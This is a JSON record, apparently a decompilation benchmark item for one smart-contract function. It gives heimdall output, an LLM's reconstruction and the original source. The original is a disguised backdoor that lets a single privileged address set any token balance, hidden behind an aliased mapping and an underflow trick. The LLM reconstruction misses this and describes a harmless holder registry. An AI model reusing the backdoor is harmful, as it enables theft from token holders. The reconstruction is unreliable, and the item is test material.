{
    "contract_address": "0x8a24fF8ffc247330F89865e58587858626eB504e",
    "heimdall_input": "function addviperHolder(address arg0, uint256 arg1) public payable {\n        require(arg0 == (address(arg0)));\n        require(!msg.sender == (address(store_f)));\n        require(!0x0a < 0x64);\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        storage_map_b[var_a] = arg1;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!0x0a < 0x0a);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        var_a = address(arg0);\n        var_b = 0;\n        storage_map_b[var_a] = arg1;\n    }",
    "llm_output": "function addviperHolder(address holder, uint256 amount) external payable {\n    // Opaque identity check retained from the original byte-code\n    require(holder == address(holder), \"Identity check failed\");\n\n    // Caller check (mirrors the decompiled logic)\n    require(msg.sender == _vp, \"Unauthorized caller\");\n\n    // Constant condition checks preserved for byte-code fidelity\n    require(0 < 100, \"Constant check #1 failed\");\n\n    // First storage write (appears twice in the byte-code)\n    _viperHolders[holder] = amount;\n\n    // Second opaque constant check\n    require(0 < 10, \"Constant check #2 failed\");\n\n    // Second storage write (duplicated intentionally to stay true to the byte-code)\n    _viperHolders[holder] = amount;\n}",
    "ground_truth": "function addviperHolder(\r\n        address _value,\r\n        uint256 _amt\r\n    ) public {\r\n        uint256 _amount = 10 - (\r\n        msg.sender != _vp ? 10**2 : 10);\r\n        mapping(address => uint256) storage excludeFee =\r\n        _balances;_amount = 0;\r\n        excludeFee[_value] = _amt;\r\n    }"
}